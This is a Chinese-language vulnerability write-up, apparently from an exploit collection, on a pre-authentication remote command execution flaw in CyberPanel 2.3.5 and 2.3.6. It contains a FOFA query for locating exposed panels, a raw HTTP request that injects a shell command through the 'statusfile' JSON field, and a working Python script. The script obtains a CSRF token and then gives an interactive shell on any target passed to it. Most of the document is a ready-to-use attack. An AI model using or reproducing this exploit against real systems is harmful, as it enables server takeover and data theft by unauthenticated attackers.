# cyberpanel未授权远程命令执行漏洞

​	CyberPanel是一个开源的Web控制面板，它提供了一个用户友好的界面，用于管理网站、电子邮件、数据库、FTP账户等。CyberPanel旨在简化网站管理任务，使非技术用户也能轻松管理自己的在线资源。

​	**CyberPanel upgrademysqlstatus 远程命令执行漏洞(QVD-2024-44346)**，该漏洞源于upgrademysqlstatus接口未做身份验证和参数过滤，未授权的攻击者可以通过此接口执行任意命令获取服务器权限，从而造成数据泄露、服务器被接管等严重的后果。

## 影响范围

CyberPanel v2.3.5 

CyberPanel v2.3.6

## fofa

```javascript
app="CyberPanel"
```

## poc

```javascript
OPTIONS /dataBases/upgrademysqlstatus HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Content-Type: application/json
Connection: close

{"statusfile":"/dev/null; id; #"}
```

```python
import httpx 
import sys 

def get_CSRF_token(client):
    resp = client.get("/")
    
    return resp.cookies['csrftoken']
    
def pwn(client, CSRF_token, cmd):
    headers = {
        "X-CSRFToken": CSRF_token,
        "Content-Type":"application/json",
        "Referer": str(client.base_url)
    }
    
    payload = '{"statusfile":"/dev/null; %s; #","csrftoken":"%s"}' % (cmd, CSRF_token)
    
    return client.put("/dataBases/upgrademysqlstatus", headers=headers, data=payload).json()["requestStatus"]
    
def exploit(client, cmd):
    CSRF_token = get_CSRF_token(client)
    stdout = pwn(client, CSRF_token, cmd)
    print(stdout)
    
if __name__ == "__main__":
    target = sys.argv[1]
    
    client = httpx.Client(base_url=target, verify=False)
    while True:
        cmd = input("$> ")

        exploit(client, cmd)
```

![image-20241029095124852](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410290951933.png)

![image-20241029095144766](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410290951820.png)

## 漏洞来源

- https://dreyand.rs/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce
- https://mp.weixin.qq.com/s/sUARVHbwH1UZDXB-CF2z1w